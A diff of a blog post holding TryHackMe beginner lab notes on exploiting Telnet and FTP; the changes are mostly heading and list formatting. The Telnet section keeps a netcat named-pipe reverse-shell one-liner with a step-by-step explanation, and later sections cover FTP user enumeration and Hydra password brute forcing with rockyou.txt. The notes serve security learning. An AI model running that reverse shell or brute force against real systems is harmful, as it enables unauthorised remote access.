@@ -1,6 +1,6 @@
 ---
 title: 'TryHackMe: Complete Beginner'
-date: 2021-10-02 05:00:00.000000000 Z
+date: 2021-10-02 12:00:00.000000000 Z
 layout: post-external
 original_link: https://cardboard-iguana.com/log/2021-10-02-tryhackme-complete-beginner.html
 author: 100007
@@ -9,8 +9,8 @@ author: 100007
 <h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
 <p><strong>author:</strong> Nathan Acks<br />
 <strong>date:</strong> 2021-10-02</p>
-<h2 id="network-services">Network Services</h2>
-<h3 id="exploiting-telnet">Exploiting Telnet</h3>
+<h1 id="network-services">Network Services</h1>
+<h2 id="exploiting-telnet">Exploiting Telnet</h2>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Listen for ICMP ping packets on an interface:</span>
 <span class="c">#</span>
 <span class="nb">sudo </span>tcpdump ip proto <span class="se">\i</span>cmp <span class="nt">-i</span> <span class="nv">$IFACE</span>
@@ -28,31 +28,28 @@ nc <span class="nv">$LOCAL_IP</span> <span class="nv">$LOCAL_PORT</span> 0&lt;/t
 /bin/sh <span class="o">&gt;</span>/tmp/qdsrgu 2&gt;&amp;1<span class="p">;</span> <span class="se">\</span>
 <span class="nb">rm</span> /tmp/qdsrgu
 </code></pre></div></div>
-<p>($LOCAL_IP and $LOCAL_PORT aren’t literal — they’re <em>actually</em> the local IP address of my machine on TryHackMe’s VPN and my chosen port. Neither of which should be particularly sensitive, but I’m still not going to post it on the internet!)</p>
+<p>($LOCAL_IP and $LOCAL_PORT aren’t literal - they’re <em>actually</em> the local IP address of my machine on TryHackMe’s VPN and my chosen port. Neither of which should be particularly sensitive, but I’m still not going to post it on the internet!)</p>
 <p>What’s going on here?</p>
 <ul>
 <li><code class="language-plaintext highlighter-rouge">mkfifo /tmp/qdsrgu</code> creates a named pipe at /tmp/qdsrgu.</li>
 <li>We then spin up a netcat instance directed at our local machine (<code class="language-plaintext highlighter-rouge">nc $LOCAL_IP $LOCAL_PORT</code>), direct the contents of the pipe into netcat’s STDIN (<code class="language-plaintext highlighter-rouge">0&lt; /tmp/qdsrgu</code>), pipe the <em>output</em> of netcat to a shell we know probably exists (<code class="language-plaintext highlighter-rouge">| /bin/sh</code>), and finally redirect <em>both</em> STDOUT and STDERR back into the named pipe (<code class="language-plaintext highlighter-rouge">&gt; /tmp/qdsrgu 2&gt;&amp;1</code>).</li>
 <li>On the local machine, <code class="language-plaintext highlighter-rouge">nc -lvp $LOCAL_PORT</code> listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh <em>there</em>. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.</li>
 </ul>
-<h3 id="understanding-ftp">Understanding FTP</h3>
+<h2 id="understanding-ftp">Understanding FTP</h2>
 <p>The active vs. passive FTP distinction is about how the <em>server</em> handles establishing the data channel (the command channel is always set up by the client connecting to the server).</p>
-<ul>
-<li>Active FTP: The client opens a port which the server <em>actively</em> connects to when establishing the data channel.</li>
-<li>Passive FTP: The server opens a port which the client connects to when establishing the data channel.</li>
-</ul>
-<p>References:</p>
+<p>Active FTP: The client opens a port which the server <em>actively</em> connects to when establishing the data channel.</p>
+<p>Passive FTP: The server opens a port which the client connects to when establishing the data channel.</p>
 <ul>
 <li><a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol">File Transfer Protocol (Wikipedia)</a></li>
 </ul>
-<h3 id="enumerating-ftp">Enumerating FTP</h3>
+<h2 id="enumerating-ftp">Enumerating FTP</h2>
 <p>FTP denotes user accounts using a leading tilde; thus <code class="language-plaintext highlighter-rouge">cwd ~admin</code> will attempt to change the current working directory to the home directory of the <code class="language-plaintext highlighter-rouge">admin</code> user. Some (older) FTP daemons have a vulnerability where they allow the use of the <code class="language-plaintext highlighter-rouge">cwd</code> directory before login, and will return an error when attempting to change to a non-existent user directory.</p>
 <p>Use nmap’s -sV option to attempt to probe for the service name and version information behind an open port.</p>
 <p>Anonymous FTP logins, if allowed, use the username <code class="language-plaintext highlighter-rouge">anonymous</code> and a blank password.</p>
 <ul>
 <li><a href="https://www.exploit-db.com/exploits/20745">Solaris 2.6/7.0 - IN.FTPD CWD ‘Username’ Enumeration</a></li>
 </ul>
-<h3 id="exploiting-ftp">Exploiting FTP</h3>
+<h2 id="exploiting-ftp">Exploiting FTP</h2>
 <p>Hydra can directly try to brute force passwords on remote machines.</p>
 <p>Kali’s rockyou.txt.gz is apparently a list of 14 million passwords dumped during the hack of some service called RockYou that I hadn’t previously heard of. Apparently RockYou was a social network that allowed direct connection to other social networks (including Facebook and MySpace)… And stored all of the relevant passwords (including their own) in the clear!</p>
 <ul>
